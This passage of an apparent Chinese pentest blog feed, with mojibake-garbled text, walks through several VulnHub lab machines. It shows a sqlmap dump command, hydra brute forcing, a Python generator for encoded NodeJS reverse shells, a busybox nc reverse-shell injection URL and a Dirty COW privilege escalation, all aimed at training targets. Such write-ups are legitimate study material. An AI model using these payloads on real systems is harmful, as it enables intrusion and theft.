16:44:51</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°å¯†ç :supplier/supplier ç™»å½•ä¸Šå» <a href="/images/2018/10/2018-10-06-16-48-29å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-16-48-29å±å¹•æˆªå›¾.png" /></a> éšæ‰‹ä¸€æµ‹ä¸€ä¸ªæ³¨å…¥... <a href="/images/2018/10/2018-10-06-16-51-09å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-16-51-09å±å¹•æˆªå›¾.png" /></a> sqlmapè·‘ä¸€ä¸‹,çœŸçš„è·‘çš„å¾ˆæ…¢...</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.106/supplier/edit_product.php?id=16&quot; --cookie=&quot;PHPSESSID=ddqpnve2g6ptetfu39b5kdoj24&quot; -o -D BlackMarket -T flag --dump</span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-06-19-10-26å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-19-10-26å±å¹•æˆªå›¾.png" /></a> è„±åº“å¤ªæ…¢äº†,ç›´æ¥ç”¨åˆ«äººçš„å›¾äº† <a href="/images/2018/10/0.7d9nzmb276f.png"><img src="/images/2018/10/0.7d9nzmb276f.png" /></a> <a href="/images/2018/10/0.dlp3yrthkfj.png"><img src="/images/2018/10/0.dlp3yrthkfj.png" /></a></p><h2 id="flag2">flag2</h2><p>å‘ç°æ³¨å…¥å¯ä»¥è¯»å–æ–‡ä»¶,è¯»/etc/passwdå‘ç°ftpç”¨æˆ·nicky</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">...</span><br><span class="line">dimitri:x:1000:1000:,,,:/home/dimitri:/bin/bash</span><br><span class="line">jbourne:x:1001:1001::/var/www/html/jbourne:</span><br><span class="line">nicky:x:1002:1002:,,,:/home/nicky:/bin/ftponly</span><br><span class="line">ftp:x:112:120:ftp daemon,,,:/srv/ftp:/bin/false</span><br></pre></td></tr></table></figure><p>hydraçˆ†ä¸€ä¸‹ <a href="/images/2018/10/2018-10-06-19-19-51å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-19-19-51å±å¹•æˆªå›¾.png" /></a> ç™»å½•è¿›å»å‘ç°æ–‡ä»¶ä¸‹ä¸‹æ¥ <a href="/images/2018/10/2018-10-06-19-22-05å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-19-22-05å±å¹•æˆªå›¾.png" /></a></p><blockquote><p>flag2{Q29uZ3JhdHMgUHJvY2VlZCBGdXJ0aGVy} If anyone reading this message it means you are on the right track however I do not have any idea about the CIA blackmarket Vehical workshop. You must find out and hack it!</p></blockquote><p>flag2çš„hint:Congrats Proceed Further</p><h2 id="flag4">flag4</h2><p>adminç•Œé¢æœ‰ç”¨æˆ·ç®¡ç†,ä¿®æ”¹å¯†ç å¤„å­˜åœ¨æ¼æ´,å¯ä»¥æŒ‡å®šç”¨æˆ·ä¿®æ”¹,æ”¹æ‰id=1çš„ç”¨æˆ· <a href="/images/2018/10/2018-10-06-19-37-29å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-19-37-29å±å¹•æˆªå›¾.png" /></a> ç™»å½•ç›´æ¥æ‹¿åˆ°flag <a href="/images/2018/10/2018-10-06-19-38-51å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-19-38-51å±å¹•æˆªå›¾.png" /></a> è§£ä¸€ä¸‹,nothing is here</p><h2 id="flag5">flag5</h2><p>æ ¹æ®ä¸Šæ¡hint,ç™»å½•ä¸€ä¸‹é‚®ç®±(jbourne:?????) <a href="/images/2018/10/2018-10-06-20-01-23å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-20-01-23å±å¹•æˆªå›¾.png" /></a> æ‹¿åˆ°ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Flag5&#123;RXZlcnl0aGluZyBpcyBlbmNyeXB0ZWQ=&#125;</span><br><span class="line"></span><br><span class="line">HELLO Friend,</span><br><span class="line"></span><br><span class="line">I have intercept the message from Russian&#x27;s some how we are working on the same</span><br><span class="line">direction, however, I couldn&#x27;t able to decode the message. </span><br><span class="line"></span><br><span class="line">&lt;Message Begins&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sr Wrnrgir</span><br><span class="line">Ru blf ziv ivzwrmt gsrh R nrtsg yv mlg zorev. R szev kozxv z yzxpwlli rm Yozxpnzipvg</span><br><span class="line">dliphslk fmwvi /ptyyzxpwlli ulowvi blf nfhg szev gl fhv</span><br><span class="line">KzhhKzhh.qkt rm liwvi gl tvg zxxvhh.</span><br><span class="line"></span><br><span class="line">&lt;/end&gt;</span><br></pre></td></tr></table></figure><p><a href="https://quipqiup.com/" title="https://quipqiup.com/">https://quipqiup.com/</a>è§£å¯†æ‹¿åˆ°ä¿¡æ¯Everything is encrypted è¯•äº†ä¸€ä¸‹å‡¯æ’’,å‘ç°å¹¶ä¸æ˜¯,è¯•äº†ä¸€ä¸ªæ›¿æ¢å¯†ç å¤šç»™å‡ ä¸ªçº¿ç´¢æ‹¿åˆ°æ˜æ–‡</p><blockquote><p>Hi Dimitri If you are reading this I might be not alive. I have place a backdoor in Blackmarket workshop under /kgbbackdoor folder you must have to use PassPass.jpg in order to get access</p></blockquote><h2 id="flag6">flag6</h2><p>è¿™ä¸€æ­¥åˆå¾ˆè„‘æ´äº†... è®¿é—®workshopå‘ç°404 è¯•äº†ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> &#123;a..z&#125;; <span class="keyword">do</span> <span class="built_in">printf</span> <span class="string">&quot;/<span class="variable">$&#123;c&#125;</span>workshop/:%d\n&quot;</span> $(curl -s -w %&#123;http_code&#125; -o /dev/null 192.168.1.106/<span class="variable">$&#123;c&#125;</span>workshop/); <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><a href="/images/2018/10/2018-10-06-20-23-13å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-20-23-13å±å¹•æˆªå›¾.png" /></a> å‘ç°vworkshopä¸º200,æŒ‰å‰é¢çš„ç›®å½•è¿›å»çœ‹ä¸‹ <a href="/images/2018/10/2018-10-06-20-24-22å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-20-24-22å±å¹•æˆªå›¾.png" /></a> stringsä¸€ä¸‹æ‹¿åˆ°å¯†ç  <a href="/images/2018/10/2018-10-06-20-26-09å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-20-26-09å±å¹•æˆªå›¾.png" /></a> è§£ä¸€ä¸‹,æ‹¿åˆ°çœŸå®å¯†ç <code>HailKGB</code> <a href="/images/2018/10/2018-10-06-20-27-23å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-20-27-23å±å¹•æˆªå›¾.png" /></a> è®¿é—®backdoor.php,å‘ç°404,ä½†æ˜¯é¡µé¢ä¸ä¸€æ · <a href="/images/2018/10/2018-10-06-20-29-44å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-20-29-44å±å¹•æˆªå›¾.png" /></a> å‘ç°å…¶å®æœ‰å¯†ç ,postä¸€ä¸‹å‘ç°ç¡®å®æ˜¯åé—¨ <a href="/images/2018/10/2018-10-06-20-32-52å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-20-32-52å±å¹•æˆªå›¾.png" /></a> æ‹¿åˆ°flag6 flag6{Um9vdCB0aW1l} è§£ä¸€ä¸‹:Root time</p><h2 id="ææƒ">ææƒ</h2><p>ç›´æ¥ä¸Šè„ç‰› rootå¯†ç å˜æˆäº†dirtyCowFun ç™»å½•ä¸Šå»æ‹¿åˆ°æœ€åçš„flag <a href="/images/2018/10/2018-10-06-21-17-07å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-06-21-17-07å±å¹•æˆªå›¾.png" /></a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€(trollcave)</title>
      <link href="/2018/10/04/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftrollcave/"/>
      <url>/2018/10/04/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftrollcave/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/trollcave-12,230/" title="https://www.vulnhub.com/entry/trollcave-12,230/">https://www.vulnhub.com/entry/trollcave-12,230/</a> ç¬¬ä¸€æ¬¡æ‰“åˆ°rubyçš„ç«™...å‡ ä¹å®Œå…¨ä¸ä¼š..ç®€å•è®°å½•ä¸‹å§</p><h2 id="ipå’Œç«¯å£">ipå’Œç«¯å£</h2><p>é¶æœºip:192.168.1.101 ç«¯å£æƒ…å†µ <a href="/images/2018/10/2018-10-04-17-16-01å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-16-01å±å¹•æˆªå›¾-300x135.png" /></a></p><h2 id="webç«™ç‚¹è¸©ç‚¹">webç«™ç‚¹è¸©ç‚¹</h2><p>è¿›å»å‘ç°å°±æ˜¯ä¸ªæ™®é€šçš„ç«™ç‚¹ <a href="/images/2018/10/2018-10-04-17-16-59å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-16-59å±å¹•æˆªå›¾-300x200.png" /></a> æ³¨å†ŒåŠŸèƒ½å…³é—­äº†,ä¹Ÿæ²¡å•¥åŠŸèƒ½,dirbæ‰«ä¸€ä¸‹ <a href="/images/2018/10/2018-10-04-17-19-06å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-19-06å±å¹•æˆªå›¾-300x191.png" /></a> è¿›å»ä¸€çœ‹å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨,éƒ½éœ€è¦ç™»å½•... æ³¨æ„åˆ°æ–‡ç«  <a href="/images/2018/10/2018-10-04-17-19-55å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-19-55å±å¹•æˆªå›¾-300x300.png" /></a> ç„¶è€Œå»è®¿é—®å¹¶æ²¡æœ‰ä¸œè¥¿ <a href="/images/2018/10/2018-10-04-17-20-36å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-20-36å±å¹•æˆªå›¾-300x150.png" /></a> å°è¯•ç”¨å„ç§adminçš„åå­—å»ç”¨hydraçˆ†ç ´ssh,ä½†æ˜¯å¤±è´¥äº† çœ‹äº†wpæ‰çŸ¥é“rubyçš„resetpassword,å‚è€ƒruby on railsçš„æ•™ç¨‹ <a href="https://www.railstutorial.org/book/password_reset#sec-password_resets_resource" title="https://www.railstutorial.org/book/password_reset#sec-password_resets_resource">https://www.railstutorial.org/book/password_reset#sec-password_resets_resource</a> <a href="/images/2018/10/2018-10-04-17-25-38å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-25-38å±å¹•æˆªå›¾-300x126.png" /></a> é‚£ä¹ˆå»è®¿é—®ä¸€ä¸‹ <a href="/images/2018/10/2018-10-04-17-26-32å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-26-32å±å¹•æˆªå›¾-300x174.png" /></a> å‘ç°é‡ç½®å¯†ç é¡µé¢,ç„¶è€Œå¹¶ä¸èƒ½é‡ç½®superadminçš„å¯†ç ,å°è¯•é‡ç½®æ™®é€šç”¨æˆ·çš„å¯†ç  <a href="/images/2018/10/2018-10-04-17-29-21å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-29-21å±å¹•æˆªå›¾-300x234.png" /></a> å‘ç°åé¢æœ‰ä¸ªnameå‚æ•°,æˆ‘ä»¬æ”¹æˆKing,å†å»é‡ç½® <a href="/images/2018/10/2018-10-04-17-37-01å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-37-01å±å¹•æˆªå›¾-300x252.png" /></a> æˆåŠŸè¿›å…¥ç®¡ç†é¡µé¢ <a href="/images/2018/10/2018-10-04-17-38-02å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-38-02å±å¹•æˆªå›¾-300x160.png" /></a></p><h2 id="getshell">getshell</h2><p>è¿›å»ä¹‹åå‘ç°æœ‰ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢,ä½†æ˜¯å› ä¸ºadminå…³é—­å¹¶ä¸èƒ½ä½¿ç”¨,æˆ‘ä»¬å»æ‰“å¼€ä¸€ä¸‹ <a href="/images/2018/10/2018-10-04-17-38-58å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-38-58å±å¹•æˆªå›¾-300x265.png" /></a> è¦æ˜¯phpåˆ°è¿™é‡Œå…¶å®å°±å¾ˆç®€å•äº†,ç›´æ¥ä¸Šä¼ ä¸€å¥è¯å°±ç»“æŸäº†,ä½†æ˜¯rubyå¹¶ä¸æ˜¯çš„...è¿™é‡Œæ˜¯ç”¨ä¼ sshå¯†é’¥çš„æ–¹å¼..ä¼ æ–‡ä»¶å¯ä»¥ç›®å½•ç©¿è¶Š,ä½†æ˜¯æˆ‘ä»¬æ€ä¹ˆçŸ¥é“å¾€å“ªä¼ å‘¢?ç™»å½•ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ›´å¤šæ–‡ç« ,æ¯”å¦‚ <a href="/images/2018/10/2018-10-04-17-47-22å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-47-22å±å¹•æˆªå›¾-300x248.png" /></a> å‘ç°å­˜åœ¨railsç”¨æˆ·å’Œcoderguysç”¨æˆ·,å…¶å®è¿˜æœ‰å¾ˆå¤š,ä½†æ˜¯å°è¯•ä¹‹åå‘ç°åªæœ‰railsçš„ç”¨æˆ·ç›®å½•æœ‰.ssh,é‚£ä¹ˆå†™å…¥sshå¯†é’¥,æ‹¿åˆ°shell <a href="/images/2018/10/2018-10-04-17-52-13å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-17-52-13å±å¹•æˆªå›¾-300x220.png" /></a> ç™»å½• <a href="/images/2018/10/2018-10-04-18-00-51å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-18-00-51å±å¹•æˆªå›¾-300x156.png" /></a></p><h2 id="ææƒ">ææƒ</h2><p>é¦–å…ˆè¿˜æ˜¯çœ‹/etc/passwd <a href="/images/2018/10/2018-10-04-18-26-16å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-18-26-16å±å¹•æˆªå›¾-300x114.png" /></a> å»ç”¨æˆ·ç›®å½•çœ‹ä¸‹,åœ¨kingçš„ç›®å½•ä¸‹çœ‹åˆ°æœ‰ä¸ªcalc <a href="/images/2018/10/2018-10-04-18-27-15å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-18-27-15å±å¹•æˆªå›¾-300x246.png" /></a> å‘ç°æ˜¯ä¸ªæœ¬åœ°çš„nodejs,curlä¸€ä¸‹çœ‹ä¸‹ <a href="/images/2018/10/2018-10-04-18-28-08å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-18-28-08å±å¹•æˆªå›¾-300x38.png" /></a> ç„¶åå®¡è®¡æºç ,å‘ç°calcé‡Œé¢å­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">calc</span>(<span class="params">pathname, request, query, response</span>)</span><br><span class="line">&#123;</span><br><span class="line">    sum = query.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>];</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(sum)</span><br><span class="line">    response.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;text/plain&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">    response.<span class="title function_">end</span>(<span class="built_in">eval</span>(sum).<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨åˆ°msfçš„ä»£ç åŠ ä¸Šé­”æ”¹åˆ«äººçš„ä»£ç å†™ä¸€ä¸ªpayloadç”Ÿæˆå™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Generator for encoded NodeJS reverse shells</span></span><br><span class="line"><span class="comment"># Based on the NodeJS reverse shell by Evilpacket</span></span><br><span class="line"><span class="comment"># https://github.com/evilpacket/node-shells/blob/master/node_revshell.js</span></span><br><span class="line"><span class="comment"># Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)</span></span><br><span class="line"><span class="comment"># Insecurety Research (2013) - insecurety.net</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span> % (sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">IP_ADDR = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charencode</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;String.CharCode&quot;&quot;&quot;</span></span><br><span class="line">    encoded = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded = encoded + <span class="string">&quot;,&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(char))</span><br><span class="line">    <span class="keyword">return</span> encoded[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] LHOST = %s&quot;</span> % (IP_ADDR)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] LPORT = %s&quot;</span> % (PORT)</span><br><span class="line">NODEJS_REV_SHELL = <span class="string">&#x27;&#x27;&#x27;(function()&#123; var require = global.require  global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? &quot;cmd&quot; : &quot;/bin/sh&quot;; var net = require(&quot;net&quot;), cp = require(&quot;child_process&quot;), util = require(&quot;util&quot;), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat()&#123; client.socket = net.connect(%s, &quot;%s&quot;, function() &#123; client.socket.pipe(sh.stdin); if (typeof util.pump === &quot;undefined&quot;) &#123; sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); &#125; else &#123; util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); &#125; &#125;); socket.on(&quot;error&quot;, function(error) &#123; counter++; if(counter&lt;= 10)&#123; setTimeout(function() &#123; StagerRepeat();&#125;, 5*1000); &#125; else process.exit(); &#125;); &#125; StagerRepeat(); &#125;)();1+1;&#x27;&#x27;&#x27;</span> % (PORT, IP_ADDR)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Encoding&quot;</span></span><br><span class="line">PAYLOAD = charencode(NODEJS_REV_SHELL)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;eval(String.fromCharCode(%s))&quot;</span> % (PAYLOAD)</span><br></pre></td></tr></table></figure><p>æ³¨æ„åé¢å¸¦ä¸Š1+1;è®©æœåŠ¡å™¨æœ‰è¿”å› <a href="/images/2018/10/2018-10-04-18-38-43å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-18-38-43å±å¹•æˆªå›¾-300x192.png" /></a> ç„¶åæ‹¿åˆ°shell <a href="/images/2018/10/2018-10-04-18-38-10å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-18-38-10å±å¹•æˆªå›¾-300x68.png" /></a> ç„¶åsudo -lå‘ç°å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ,ç›´æ¥æ‹¿åˆ°root <a href="/images/2018/10/2018-10-04-18-39-41å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-04-18-39-41å±å¹•æˆªå›¾-300x148.png" /></a> å‚è€ƒwp:<a href="https://hackso.me/trollcave-1.2-walkthrough/" title="https://hackso.me/trollcave-1.2-walkthrough/">https://hackso.me/trollcave-1.2-walkthrough/</a></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€(MinUv1,basic pentesting2)</title>
      <link href="/2018/10/03/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fminuv1/"/>
      <url>/2018/10/03/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fminuv1/</url>
      
        <content type="html"><![CDATA[<h1 id="minuv1">MinUv1</h1><h2 id="ä»‹ç»">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/minu-1,235/" title="https://www.vulnhub.com/entry/minu-1,235/">https://www.vulnhub.com/entry/minu-1,235/</a></p><h2 id="ipå’Œç«¯å£">ipå’Œç«¯å£</h2><p>é¶æœºip:192.168.1.102 ç«¯å£æƒ…å†µ <a href="/images/2018/10/2018-10-03-12-59-52å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-12-59-52å±å¹•æˆªå›¾-300x125.png" /></a></p><h2 id="ä»£ç æ‰§è¡Œ">ä»£ç æ‰§è¡Œ</h2><p>å»80çœ‹ä¸‹,å‘ç°apacheçš„é»˜è®¤é…ç½®é¡µé¢ dirbæ‰«ä¸€ä¸‹,æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿,æ¢äº†ä¸ªæ‰«ç›®å½•å·¥å…· dirsearchæ‰¾åˆ°ä¸€ä¸ªtest.php ç„¶åæŸ¥çœ‹æœ€æ–°é¡µé¢å‘ç°ä¸€ä¸ªç±»ä¼¼æ–‡ä»¶åŒ…å«çš„é¡µé¢ <a href="/images/2018/10/2018-10-03-13-11-09å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-13-11-09å±å¹•æˆªå›¾-300x272.png" /></a> ç„¶åå‘ç°å¹¶ä¸æ˜¯æ–‡ä»¶åŒ…å«,è€Œæ˜¯ä»»æ„ä»£ç æ‰§è¡Œ.. ä»–åŒ…å«æºç çš„æ–¹å¼åº”è¯¥æ˜¯<code>system('cat xxx')</code>è¿™ç§ <a href="/images/2018/10/2018-10-03-13-20-24å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-13-20-24å±å¹•æˆªå›¾-300x154.png" /></a> ä¸è¿‡ä¼¼ä¹æœ‰å¾ˆå¤šå‘½ä»¤ä¼šå¤±è´¥,è¿™é‡Œæœ‰äººæä¾›äº†ä¸€ä¸ªç½‘ç«™,é‡Œé¢è›®å¤šå‘½ä»¤çš„åˆ©ç”¨çš„,åˆ†äº«ä¸€ä¸‹:<a href="https://gtfobins.github.io/" title="https://gtfobins.github.io/">https://gtfobins.github.io/</a> ç„¶åè¿™é‡Œç”¨åˆ°busybox</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/test.php?file=index;busybox%20nc%20192.168.1.105%206712%20-e%20sh%20-i</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shell <a href="/images/2018/10/2018-10-03-13-35-13å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-13-35-13å±å¹•æˆªå›¾-300x85.png" /></a></p><h2 id="ææƒ">ææƒ</h2><p>çœ‹ä¸‹/etc/passwd,å‘ç°äº†bobç”¨æˆ·,åˆ°bobçš„ç›®å½•çœ‹ä¸‹ <a href="/images/2018/10/2018-10-03-18-20-30å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-18-20-30å±å¹•æˆªå›¾-300x118.png" /></a> çœ‹ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/home/bob $ <span class="built_in">cat</span> ._pw_</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg</span><br></pre></td></tr></table></figure><p>å‘ç°æ˜¯jwt,ç”¨<a href="https://github.com/lmammino/jwt-cracker" title="å·¥å…·">å·¥å…·</a>è§£ä¸€ä¸‹ <a href="/images/2018/10/2018-10-03-18-17-33å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-18-17-33å±å¹•æˆªå›¾-300x172.png" /></a> è·‘äº†ä¸€å¹´è·‘å‡ºæ¥äº†... ç„¶è€Œç”µè„‘é‡Œä¼¼ä¹å¹¶æ²¡æœ‰python,ä¸èƒ½è°ƒç”¨su... è¿™é‡Œå°±æœ‰ä¸€ä¸ªæ–°æ–¹æ³•,å¯ä»¥è°ƒç”¨scriptæ¥æ¢ç”¨æˆ· <a href="/images/2018/10/2018-10-03-18-39-43å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-18-39-43å±å¹•æˆªå›¾-300x146.png" /></a> <a href="/images/2018/10/2018-10-03-18-42-38å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-18-42-38å±å¹•æˆªå›¾-300x185.png" /></a></p><h1 id="basic-pentesting2">basic pentesting2</h1><p>è›®æœ‰æ„æ€çš„,æ–¹æ³•è›®å¤šçš„</p><h2 id="ä»‹ç»-1">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/basic-pentesting-2,241/" title="https://www.vulnhub.com/entry/basic-pentesting-2,241/">https://www.vulnhub.com/entry/basic-pentesting-2,241/</a></p><h2 id="ipå’Œç«¯å£-1">ipå’Œç«¯å£</h2><p>é¶æœºip:192.168.1.106 ç«¯å£æƒ…å†µ <a href="/images/2018/10/2018-10-03-22-44-40å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-22-44-40å±å¹•æˆªå›¾-300x117.png" /></a></p><h2 id="getshell">getshell</h2><p>å»80ç«¯å£å‘ç°æºç é‡Œé¢çš„æ³¨é‡Š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Undergoing maintenance&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;h4&gt;Please check back later&lt;/h4&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Check our dev note section if you need to know what to work on. --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æ‰«ä¸€ä¸‹ç›®å½• <a href="/images/2018/10/2018-10-03-22-46-05å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-22-46-05å±å¹•æˆªå›¾-300x107.png" /></a> å»/developmentçœ‹ä¸‹ <a href="/images/2018/10/2018-10-03-22-46-54å±å¹•æˆªå›¾.png"><img src="/images/2018/10/2018-10-03-22-46-54å±å¹•æˆªå›¾-300x170.png" /></a> ç„¶åæ‹¿åˆ°ä¸¤ä»½ä¿¡æ¯ dev.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 